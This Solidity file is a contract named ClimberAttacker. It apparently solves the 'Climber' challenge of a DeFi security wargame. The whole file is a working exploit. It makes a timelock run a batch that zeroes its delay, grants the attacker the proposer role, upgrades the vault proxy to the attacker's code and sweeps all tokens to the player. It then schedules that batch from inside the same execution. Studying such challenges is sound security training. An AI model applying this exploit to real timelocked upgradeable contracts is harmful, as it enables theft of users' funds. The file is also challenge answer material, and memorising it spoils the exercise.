// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import { PROPOSER_ROLE } from "../ClimberConstants.sol";

interface IClimberTimelock {
    function schedule(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external;
    function execute(address[] calldata, uint256[] calldata, bytes[] calldata, bytes32) external;
}

/**
 * @title ClimberAttacker
 * @author y0ng0p3 (https://github.com/y0ng0p3/)
 */
contract ClimberAttacker is OwnableUpgradeable, UUPSUpgradeable {
        address[] private targets;
        uint256[] private values;
        bytes[] private dataElements;
        bytes32 constant SALT = keccak256("y0ng0p3");

        address immutable player;
        address payable private timelock;
        address private vault;
        address private token;

    constructor(address _timelock, address _vault, address _token) {
        player = msg.sender;
        timelock = payable(_timelock);
        vault = _vault;
        token = _token;
    }

    function attack() external {
        // update timelock's delay to 0 to execute proposal instantly
        targets.push(timelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        // grant this contract to the ``proposer``'s role
        targets.push(timelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)));

        // update the proxy to use this contract as implementation
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("upgradeTo(address)", address(this)));

        // sweep funds 
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("sweepFunds(address)", token));

        // schedule above tasks
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("timelockSchedule()"));

        // execute tasks
        timelockExecute();
    }

    function timelockSchedule() public {
        IClimberTimelock(timelock).schedule(targets, values, dataElements, SALT);
    }

    function timelockExecute() public {
        IClimberTimelock(timelock).execute(targets, values, dataElements, SALT);
    }

    // transfer all tokens to the attacker
    // once this contract became the Vault Proxy's new Logic Contract
    function sweepFunds(address _token) external {
        SafeTransferLib.safeTransfer(_token, player, IERC20(_token).balanceOf(address(this)));
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    // this function is require for inheriting from UUPSUpgradeable
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
